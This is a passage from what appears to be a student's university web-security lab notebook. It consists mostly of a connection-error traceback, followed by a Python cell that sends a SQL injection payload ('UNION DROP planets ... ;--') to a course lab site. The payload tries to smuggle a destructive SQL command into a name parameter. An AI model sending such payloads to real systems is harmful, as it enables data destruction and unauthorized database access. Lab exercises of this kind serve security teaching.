decode_content\u001b[39m=\u001b[39;49m\u001b[39mFalse\u001b[39;49;00m,\n\u001b[0;32m    495\u001b[0m         retries\u001b[39m=\u001b[39;49m\u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49mmax_retries,\n\u001b[0;32m    496\u001b[0m         timeout\u001b[39m=\u001b[39;49mtimeout,\n\u001b[0;32m    497\u001b[0m         chunked\u001b[39m=\u001b[39;49mchunked,\n\u001b[0;32m    498\u001b[0m     )\n\u001b[0;32m    500\u001b[0m \u001b[39mexcept\u001b[39;00m (ProtocolError, \u001b[39mOSError\u001b[39;00m) \u001b[39mas\u001b[39;00m err:\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\connectionpool.py:844\u001b[0m, in \u001b[0;36mHTTPConnectionPool.urlopen\u001b[1;34m(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, preload_content, decode_content, **response_kw)\u001b[0m\n\u001b[0;32m    842\u001b[0m     new_e \u001b[39m=\u001b[39m ProtocolError(\u001b[39m\"\u001b[39m\u001b[39mConnection aborted.\u001b[39m\u001b[39m\"\u001b[39m, new_e)\n\u001b[1;32m--> 844\u001b[0m retries \u001b[39m=\u001b[39m retries\u001b[39m.\u001b[39;49mincrement(\n\u001b[0;32m    845\u001b[0m     method, url, error\u001b[39m=\u001b[39;49mnew_e, _pool\u001b[39m=\u001b[39;49m\u001b[39mself\u001b[39;49m, _stacktrace\u001b[39m=\u001b[39;49msys\u001b[39m.\u001b[39;49mexc_info()[\u001b[39m2\u001b[39;49m]\n\u001b[0;32m    846\u001b[0m )\n\u001b[0;32m    847\u001b[0m retries\u001b[39m.\u001b[39msleep()\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\urllib3\\util\\retry.py:515\u001b[0m, in \u001b[0;36mRetry.increment\u001b[1;34m(self, method, url, response, error, _pool, _stacktrace)\u001b[0m\n\u001b[0;32m    514\u001b[0m     reason \u001b[39m=\u001b[39m error \u001b[39mor\u001b[39;00m ResponseError(cause)\n\u001b[1;32m--> 515\u001b[0m     \u001b[39mraise\u001b[39;00m MaxRetryError(_pool, url, reason) \u001b[39mfrom\u001b[39;00m \u001b[39mreason\u001b[39;00m  \u001b[39m# type: ignore[arg-type]\u001b[39;00m\n\u001b[0;32m    517\u001b[0m log\u001b[39m.\u001b[39mdebug(\u001b[39m\"\u001b[39m\u001b[39mIncremented Retry for (url=\u001b[39m\u001b[39m'\u001b[39m\u001b[39m%s\u001b[39;00m\u001b[39m'\u001b[39m\u001b[39m): \u001b[39m\u001b[39m%r\u001b[39;00m\u001b[39m\"\u001b[39m, url, new_retry)\n",
      "\u001b[1;31mMaxRetryError\u001b[0m: HTTPConnectionPool(host='labosecuipl.alwaysdata.net', port=80): Max retries exceeded with url: /23/s02/ex6/?name=%27UNION+DROP+planets%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27+%3B-- (Caused by NameResolutionError(\"<urllib3.connection.HTTPConnection object at 0x000001DC002EF970>: Failed to resolve 'labosecuipl.alwaysdata.net' ([Errno 11001] getaddrinfo failed)\"))",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[1;31mConnectionError\u001b[0m                           Traceback (most recent call last)",
      "\u001b[1;32mc:\\Users\\cdhae\\Documents\\2) Paul Lambin\\BAC 3 (2023-2024)\\Q1\\Sécurité\\Sécurité - Labos\\Semaine 2\\ipl_I317B_s03_web_secu.ipynb Cell 27\u001b[0m line \u001b[0;36m4\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/cdhae/Documents/2%29%20Paul%20Lambin/BAC%203%20%282023-2024%29/Q1/S%C3%A9curit%C3%A9/S%C3%A9curit%C3%A9%20-%20Labos/Semaine%202/ipl_I317B_s03_web_secu.ipynb#X35sZmlsZQ%3D%3D?line=0'>1</a>\u001b[0m \u001b[39mimport\u001b[39;00m \u001b[39mrequests\u001b[39;00m\n\u001b[1;32m----> <a href='vscode-notebook-cell:/c%3A/Users/cdhae/Documents/2%29%20Paul%20Lambin/BAC%203%20%282023-2024%29/Q1/S%C3%A9curit%C3%A9/S%C3%A9curit%C3%A9%20-%20Labos/Semaine%202/ipl_I317B_s03_web_secu.ipynb#X35sZmlsZQ%3D%3D?line=3'>4</a>\u001b[0m page \u001b[39m=\u001b[39m requests\u001b[39m.\u001b[39;49mget(\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/cdhae/Documents/2%29%20Paul%20Lambin/BAC%203%20%282023-2024%29/Q1/S%C3%A9curit%C3%A9/S%C3%A9curit%C3%A9%20-%20Labos/Semaine%202/ipl_I317B_s03_web_secu.ipynb#X35sZmlsZQ%3D%3D?line=4'>5</a>\u001b[0m     \u001b[39m\"\u001b[39;49m\u001b[39mhttp://labosecuipl.alwaysdata.net/23/s02/ex6/\u001b[39;49m\u001b[39m\"\u001b[39;49m,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/cdhae/Documents/2%29%20Paul%20Lambin/BAC%203%20%282023-2024%29/Q1/S%C3%A9curit%C3%A9/S%C3%A9curit%C3%A9%20-%20Labos/Semaine%202/ipl_I317B_s03_web_secu.ipynb#X35sZmlsZQ%3D%3D?line=5'>6</a>\u001b[0m     params\u001b[39m=\u001b[39;49m{\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/cdhae/Documents/2%29%20Paul%20Lambin/BAC%203%20%282023-2024%29/Q1/S%C3%A9curit%C3%A9/S%C3%A9curit%C3%A9%20-%20Labos/Semaine%202/ipl_I317B_s03_web_secu.ipynb#X35sZmlsZQ%3D%3D?line=6'>7</a>\u001b[0m         \u001b[39m\"\u001b[39;49m\u001b[39mname\u001b[39;49m\u001b[39m\"\u001b[39;49m: \u001b[39m\"\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39mUNION DROP planets, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m,\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m, \u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39ma\u001b[39;49m\u001b[39m'\u001b[39;49m\u001b[39m ;--\u001b[39;49m\u001b[39m\"\u001b[39;49m,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/cdhae/Documents/2%29%20Paul%20Lambin/BAC%203%20%282023-2024%29/Q1/S%C3%A9curit%C3%A9/S%C3%A9curit%C3%A9%20-%20Labos/Semaine%202/ipl_I317B_s03_web_secu.ipynb#X35sZmlsZQ%3D%3D?line=7'>8</a>\u001b[0m     }\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/cdhae/Documents/2%29%20Paul%20Lambin/BAC%203%20%282023-2024%29/Q1/S%C3%A9curit%C3%A9/S%C3%A9curit%C3%A9%20-%20Labos/Semaine%202/ipl_I317B_s03_web_secu.ipynb#X35sZmlsZQ%3D%3D?line=8'>9</a>\u001b[0m )\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/cdhae/Documents/2%29%20Paul%20Lambin/BAC%203%20%282023-2024%29/Q1/S%C3%A9curit%C3%A9/S%C3%A9curit%C3%A9%20-%20Labos/Semaine%202/ipl_I317B_s03_web_secu.ipynb#X35sZmlsZQ%3D%3D?line=10'>11</a>\u001b[0m \u001b[39mprint\u001b[39m(page\u001b[39m.\u001b[39mtext)\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\requests\\api.py:73\u001b[0m, in \u001b[0;36mget\u001b[1;34m(url, params, **kwargs)\u001b[0m\n\u001b[0;32m     62\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39mget\u001b[39m(url, params\u001b[39m=\u001b[39m\u001b[39mNone\u001b[39;00m, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mkwargs):\n\u001b[0;32m     63\u001b[0m \u001b[39m    \u001b[39m\u001b[39mr\u001b[39m\u001b[39m\"\"\"Sends a GET request.\u001b[39;00m\n\u001b[0;32m     64\u001b[0m \n\u001b[0;32m     65\u001b[0m \u001b[39m    :param url: URL for the new :class:`Request` object.\u001b[39;00m\n\u001b[1;32m   (...)\u001b[0m\n\u001b[0;32m     70\u001b[0m \u001b[39m    :rtype: requests.Response\u001b[39;00m\n\u001b[0;32m     71\u001b[0m \u001b[39m    \"\"\"\u001b[39;00m\n\u001b[1;32m---> 73\u001b[0m     \u001b[39mreturn\u001b[39;00m request(\u001b[39m\"\u001b[39m\u001b[39mget\u001b[39m\u001b[39m\"\u001b[39m, url, params\u001b[39m=\u001b[39mparams, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mkwargs)\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\requests\\api.py:59\u001b[0m, in \u001b[0;36mrequest\u001b[1;34m(method, url, **kwargs)\u001b[0m\n\u001b[0;32m     55\u001b[0m \u001b[39m# By using the 'with' statement we are sure the session is closed, thus we\u001b[39;00m\n\u001b[0;32m     56\u001b[0m \u001b[39m# avoid leaving sockets open which can trigger a ResourceWarning in some\u001b[39;00m\n\u001b[0;32m     57\u001b[0m \u001b[39m# cases, and look like a memory leak in others.\u001b[39;00m\n\u001b[0;32m     58\u001b[0m \u001b[39mwith\u001b[39;00m sessions\u001b[39m.\u001b[39mSession() \u001b[39mas\u001b[39;00m session:\n\u001b[1;32m---> 59\u001b[0m     \u001b[39mreturn\u001b[39;00m session\u001b[39m.\u001b[39mrequest(method\u001b[39m=\u001b[39mmethod, url\u001b[39m=\u001b[39murl, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mkwargs)\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\requests\\sessions.py:589\u001b[0m, in \u001b[0;36mSession.request\u001b[1;34m(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)\u001b[0m\n\u001b[0;32m    584\u001b[0m send_kwargs \u001b[39m=\u001b[39m {\n\u001b[0;32m    585\u001b[0m     \u001b[39m\"\u001b[39m\u001b[39mtimeout\u001b[39m\u001b[39m\"\u001b[39m: timeout,\n\u001b[0;32m    586\u001b[0m     \u001b[39m\"\u001b[39m\u001b[39mallow_redirects\u001b[39m\u001b[39m\"\u001b[39m: allow_redirects,\n\u001b[0;32m    587\u001b[0m }\n\u001b[0;32m    588\u001b[0m send_kwargs\u001b[39m.\u001b[39mupdate(settings)\n\u001b[1;32m--> 589\u001b[0m resp \u001b[39m=\u001b[39m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39msend(prep, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39msend_kwargs)\n\u001b[0;32m    591\u001b[0m \u001b[39mreturn\u001b[39;00m resp\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\requests\\sessions.py:703\u001b[0m, in \u001b[0;36mSession.send\u001b[1;34m(self, request, **kwargs)\u001b[0m\n\u001b[0;32m    700\u001b[0m start \u001b[39m=\u001b[39m preferred_clock()\n\u001b[0;32m    702\u001b[0m \u001b[39m# Send the request\u001b[39;00m\n\u001b[1;32m--> 703\u001b[0m r \u001b[39m=\u001b[39m adapter\u001b[39m.\u001b[39msend(request, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mkwargs)\n\u001b[0;32m    705\u001b[0m \u001b[39m# Total elapsed time of the request (approximately)\u001b[39;00m\n\u001b[0;32m    706\u001b[0m elapsed \u001b[39m=\u001b[39m preferred_clock() \u001b[39m-\u001b[39m start\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\site-packages\\requests\\adapters.py:519\u001b[0m, in \u001b[0;36mHTTPAdapter.send\u001b[1;34m(self, request, stream, timeout, verify, cert, proxies)\u001b[0m\n\u001b[0;32m    515\u001b[0m     \u001b[39mif\u001b[39;00m \u001b[39misinstance\u001b[39m(e\u001b[39m.\u001b[39mreason, _SSLError):\n\u001b[0;32m    516\u001b[0m         \u001b[39m# This branch is for urllib3 v1.22 and later.\u001b[39;00m\n\u001b[0;32m    517\u001b[0m         \u001b[39mraise\u001b[39;00m SSLError(e, request\u001b[39m=\u001b[39mrequest)\n\u001b[1;32m--> 519\u001b[0m     \u001b[39mraise\u001b[39;00m \u001b[39mConnectionError\u001b[39;00m(e, request\u001b[39m=\u001b[39mrequest)\n\u001b[0;32m    521\u001b[0m \u001b[39mexcept\u001b[39;00m ClosedPoolError \u001b[39mas\u001b[39;00m e:\n\u001b[0;32m    522\u001b[0m     \u001b[39mraise\u001b[39;00m \u001b[39mConnectionError\u001b[39;00m(e, request\u001b[39m=\u001b[39mrequest)\n",
      "\u001b[1;31mConnectionError\u001b[0m: HTTPConnectionPool(host='labosecuipl.alwaysdata.net', port=80): Max retries exceeded with url: /23/s02/ex6/?name=%27UNION+DROP+planets%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27%2C+%27a%27+%3B-- (Caused by NameResolutionError(\"<urllib3.connection.HTTPConnection object at 0x000001DC002EF970>: Failed to resolve 'labosecuipl.alwaysdata.net' ([Errno 11001] getaddrinfo failed)\"))"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "\n",
    "page = requests.get(\n",
    "    \"http://labosecuipl.alwaysdata.net/23/s02/ex6/\",\n",
    "    params={\n",
    "        \"name\": \"'UNION DROP planets, 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a','a', 'a', 'a', 'a', 'a' ;--\",\n",
    "    }\n",
    ")\n",
    "\n",
    "print(page.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
